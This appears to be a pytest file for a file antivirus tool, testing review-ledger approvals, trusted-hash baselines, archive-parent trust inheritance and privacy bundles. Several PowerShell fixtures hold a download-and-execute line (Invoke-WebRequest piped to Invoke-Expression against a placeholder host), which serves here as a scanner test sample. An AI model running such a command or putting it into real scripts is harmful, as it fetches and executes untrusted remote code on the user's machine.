from __future__ import annotations

import csv
import json
import zipfile
from pathlib import Path

from file_antivirus import run_file_av_scan
from file_av_review import build_file_av_review_template, apply_file_av_review_ledger
from file_av_baseline import build_file_av_baseline, apply_file_av_baseline


def _approve_all_review_rows(ledger_path: Path) -> int:
    rows = []
    with ledger_path.open("r", encoding="utf-8", newline="") as f:
        for row in csv.DictReader(f):
            row["operator_decision"] = "ALLOW_LOG"
            row["operator"] = "test"
            row["notes"] = "trusted local helper script"
            rows.append(row)
    with ledger_path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    return len(rows)


def test_file_av_build_and_apply_trusted_baseline(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    helper = root / "helper.ps1"
    helper.write_text("Remove-Item -Recurse $env:TEMP\\demo -ErrorAction SilentlyContinue\n", encoding="utf-8")
    out = tmp_path / "out"
    run_file_av_scan(paths=[str(root)], output_dir=str(out), clean_output=True, bundle_output=False)
    build_file_av_review_template(str(out), bundle_output=False)
    rows = _approve_all_review_rows(out / "file_av_review_ledger_template.csv")
    assert rows >= 1
    apply_file_av_review_ledger(str(out), ledger=str(out / "file_av_review_ledger_template.csv"), bundle_output=False)

    baseline_summary = build_file_av_baseline(str(out), bundle_output=True, privacy_bundle=True)
    assert baseline_summary["baseline_entries"] >= 1
    baseline_path = out / "trusted_file_baseline.json"
    baseline = json.loads(baseline_path.read_text(encoding="utf-8"))
    assert baseline["summary"]["entries"] >= 1

    # Rescan the same helper with no human ledger, then apply baseline.
    out2 = tmp_path / "out2"
    run_file_av_scan(paths=[str(root)], output_dir=str(out2), clean_output=True, bundle_output=False)
    result = apply_file_av_baseline(str(out2), baseline=str(baseline_path), bundle_output=True, privacy_bundle=True)
    assert result["baseline_matches"] >= 1
    assert result["pending_review_rows"] == 0
    assert result["by_effective_decision"].get("ALLOW_LOG", 0) >= 1
    effective = json.loads((out2 / "effective_file_av_baseline_decisions.json").read_text(encoding="utf-8"))
    matched = [i for i in effective["items"] if i.get("baseline_status") == "matched"]
    assert matched
    assert all(i["effective_decision"] == "ALLOW_LOG" for i in matched)
    assert any("baseline_trusted_hash" in i.get("labels", []) for i in matched)


def test_file_av_baseline_privacy_bundle_excludes_local_db(tmp_path: Path):
    root = tmp_path / "fixture"
    root.mkdir()
    (root / "helper.ps1").write_text("Remove-Item -Recurse $env:TEMP\\demo\n", encoding="utf-8")
    out = tmp_path / "out"
    run_file_av_scan(paths=[str(root)], output_dir=str(out), clean_output=True, bundle_output=False)
    build_file_av_review_template(str(out), bundle_output=False)
    _approve_all_review_rows(out / "file_av_review_ledger_template.csv")
    apply_file_av_review_ledger(str(out), ledger=str(out / "file_av_review_ledger_template.csv"), bundle_output=False)
    build_file_av_baseline(str(out), bundle_output=True, privacy_bundle=True)
    with zipfile.ZipFile(out / "pooleshield_results_bundle.zip") as z:
        names = set(z.namelist())
        manifest = json.loads(z.read("BUNDLE_MANIFEST.json").decode("utf-8"))
    assert "trusted_file_baseline.json" not in names
    assert "trusted_file_baseline.md" not in names
    excluded = set(manifest.get("excluded_content_files", []))
    assert {"trusted_file_baseline.json", "trusted_file_baseline.csv", "trusted_file_baseline.md"}.issubset(excluded)


def test_file_av_baseline_trusts_reviewed_archive_entries_by_parent_hash(tmp_path: Path):
    archive = tmp_path / "trusted_package.zip"
    with zipfile.ZipFile(archive, "w") as z:
        z.writestr("README.md", "trusted package fixture")
        z.writestr("tools/helper.ps1", "Invoke-WebRequest http://example.invalid/file | Invoke-Expression")

    reviewed = tmp_path / "reviewed"
    run_file_av_scan(paths=[str(archive)], output_dir=str(reviewed), clean_output=True, bundle_output=False)
    build_file_av_review_template(str(reviewed), bundle_output=False)

    ledger_path = reviewed / "file_av_review_ledger_template.csv"
    rows = []
    with ledger_path.open("r", encoding="utf-8", newline="") as f:
        for row in csv.DictReader(f):
            # Approve only the archive container, not its suspicious child entry.
            if row.get("display_path", "").endswith("trusted_package.zip") and row.get("kind") == "file":
                row["operator_decision"] = "ALLOW_LOG"
                row["operator"] = "test"
                row["notes"] = "reviewed trusted package archive"
            rows.append(row)
    with ledger_path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    apply_file_av_review_ledger(str(reviewed), ledger=str(ledger_path), bundle_output=False)

    baseline_path = tmp_path / "local_trust" / "trusted_file_baseline.json"
    build_file_av_baseline(str(reviewed), baseline_path=str(baseline_path), bundle_output=False)

    out2 = tmp_path / "rescan"
    run_file_av_scan(paths=[str(archive)], output_dir=str(out2), clean_output=True, bundle_output=False)
    result = apply_file_av_baseline(str(out2), baseline=str(baseline_path), bundle_output=False)
    assert result["baseline_matches"] >= 2
    assert result["pending_review_rows"] == 0

    effective = json.loads((out2 / "effective_file_av_baseline_decisions.json").read_text(encoding="utf-8"))
    child = [i for i in effective["items"] if i["display_path"].endswith("!tools/helper.ps1")][0]
    assert child["effective_decision"] == "ALLOW_LOG"
    assert child["baseline_status"] == "archive_parent_matched"
    assert child["baseline_match_type"] == "archive_parent_hash"
    assert "baseline_trusted_archive" in child.get("labels", [])


def test_file_av_build_baseline_merge_existing_preserves_old_entries(tmp_path: Path):
    root_a = tmp_path / "fixture_a"
    root_a.mkdir()
    helper_a = root_a / "helper_a.ps1"
    helper_a.write_text("Remove-Item -Recurse $env:TEMP\\demo_a -ErrorAction SilentlyContinue\n", encoding="utf-8")
    out_a = tmp_path / "out_a"
    run_file_av_scan(paths=[str(root_a)], output_dir=str(out_a), clean_output=True, bundle_output=False)
    build_file_av_review_template(str(out_a), bundle_output=False)
    _approve_all_review_rows(out_a / "file_av_review_ledger_template.csv")
    apply_file_av_review_ledger(str(out_a), ledger=str(out_a / "file_av_review_ledger_template.csv"), bundle_output=False)

    baseline_path = tmp_path / "local_trust" / "trusted_file_baseline.json"
    first = build_file_av_baseline(str(out_a), baseline_path=str(baseline_path), bundle_output=False)
    assert first["baseline_entries"] >= 1

    root_b = tmp_path / "fixture_b"
    root_b.mkdir()
    helper_b = root_b / "helper_b.ps1"
    helper_b.write_text("Invoke-WebRequest http://example.invalid/file | Invoke-Expression\n", encoding="utf-8")
    out_b = tmp_path / "out_b"
    run_file_av_scan(paths=[str(root_b)], output_dir=str(out_b), clean_output=True, bundle_output=False)
    build_file_av_review_template(str(out_b), bundle_output=False)
    _approve_all_review_rows(out_b / "file_av_review_ledger_template.csv")
    apply_file_av_review_ledger(str(out_b), ledger=str(out_b / "file_av_review_ledger_template.csv"), bundle_output=False)

    merged = build_file_av_baseline(
        str(out_b),
        baseline_path=str(baseline_path),
        merge_existing=True,
        bundle_output=False,
    )
    assert merged["existing_entry_count"] >= 1
    assert merged["baseline_entries"] >= first["baseline_entries"] + 1

    baseline = json.loads(baseline_path.read_text(encoding="utf-8"))
    path_hints = "\n".join("\n".join(e.get("path_hints", [])) for e in baseline["entries"])
    assert "helper_a.ps1" in path_hints
    assert "helper_b.ps1" in path_hints
